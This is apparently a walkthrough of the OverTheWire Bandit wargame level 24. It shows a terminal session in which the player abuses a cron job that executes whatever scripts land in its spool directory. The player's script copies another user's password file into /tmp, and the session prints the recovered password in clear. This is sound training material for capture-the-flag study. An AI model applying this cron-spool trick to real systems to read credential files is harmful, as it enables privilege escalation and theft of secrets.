Video Solution: https://youtu.be/_REKZxwjjK8
Task on Overthewire: http://overthewire.org/wargames/bandit/bandit24.html

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy aroundâ€¦

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done


bandit23@bandit:~$ mkdir /tmp/glicone
mkdir: cannot create directory '/tmp/glicone': File exists
bandit23@bandit:~$ mkdir /tmp/glicOne
bandit23@bandit:~$ chmod 777 /tmp/glicOne
bandit23@bandit:~$ cd /tmp/glicOne
bandit23@bandit:/tmp/glicOne$ nano script.sh
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

		   #!/bin/bash
		   cat /etc/bandit_pass/bandit24 >>  /tmp/glicOne/pass

bandit23@bandit:/tmp/glicOne$ chmod a+x script.sh 
bandit23@bandit:/tmp/glicOne$ cp script.sh /var/spool/bandit24/
bandit23@bandit:/tmp/glicOne$ cat pass 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
andit23@bandit:/tmp/glicOne$ ssh bandit24@localhost

